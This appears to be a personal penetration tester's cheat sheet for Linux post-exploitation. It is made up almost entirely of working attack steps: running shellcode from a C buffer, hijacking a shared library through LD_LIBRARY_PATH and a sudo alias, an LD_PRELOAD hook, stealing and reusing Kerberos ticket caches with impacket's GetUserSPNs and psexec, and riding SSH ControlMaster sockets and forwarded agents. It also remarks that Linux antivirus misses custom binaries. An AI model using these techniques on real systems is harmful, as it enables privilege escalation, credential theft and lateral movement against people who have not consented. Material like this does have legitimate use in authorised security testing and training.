* Linux AV is bad with custom c binarys

## Shellcode execute
``` C
int (*ret)() = (int(*)())buf;
ret();
```
``` bash
gcc -o example example.c -z execstack
```

## PE
* If there is auto task running with sudo, try hijacking
* may not works depends on secure path setting
* TODO: test cross compilation
* TODO: msf shell with\without encoder
* Worked: normal without encoder + on target


### libgpg-error.so.0
``` a
export LD_LIBRARY_PATH=[path to libgpg-error.so.0's folder]
readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print "int",$8}' | sed 's/@@GPG_ERROR_1.0/;/g'
readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print $8}' | sed 's/@@GPG_ERROR_1.0/;/g'
```
``` a
gcc -Wall -fPIC -c -o test.o test.c
gcc -shared -Wl,--version-script [path to symbol map file ] -o libgpg-error.so.0 test.o
```
``` a
alias sudo="sudo LD_LIBRARY_PATH=[path to libgpg-error.so.0's folder]"
```


### geteuid
``` bash
gcc -Wall -fPIC -z execstack -c -o test.o test.c
gcc -shared -o test.so test.o -ldl
export LD_PRELOAD=[path to so file]
```
* triger
``` bash
cp /etc/passwd /tmp/test
```

## Kerberos
``` a
klist
kvno cifs/dmzdc01.complyedge.com
sudo cp /tmp/krb5cc_75401103_hOg8VH /tmp/krb5cc_minenow
export KRB5CCNAME=/tmp/krb5cc_minenow
sudo apt install krb5-user
```
* below script can work with proxychain
``` a
/usr/share/doc/python3-impacket/examples/GetADUsers.py
/usr/share/doc/python3-impacket/examples/GetUserSPNs.py
/usr/share/doc/python3-impacket/examples/psexec.py
```


## controlmaster
* Check ssh user config first  
* Check /.ssh/controlmaster/ if same user, ssh directly
* if with sudo
``` bash
ssh -S /home/testuser/.ssh/controlmaster/testuser\@testbox\:22 testuser@testbox
```

## ForwardAgent
* Check ssh user config first
* Need also enable from target
* from kali
```  bash
eval `ssh-agent` 
```

``` bash
pstree -p testuser | grep ssh
cat /proc/[pid of bash]/environ
SSH_AUTH_SOCK=[...] ssh-add -l
SSH_AUTH_SOCK=[...] ssh testuser@testbox
```





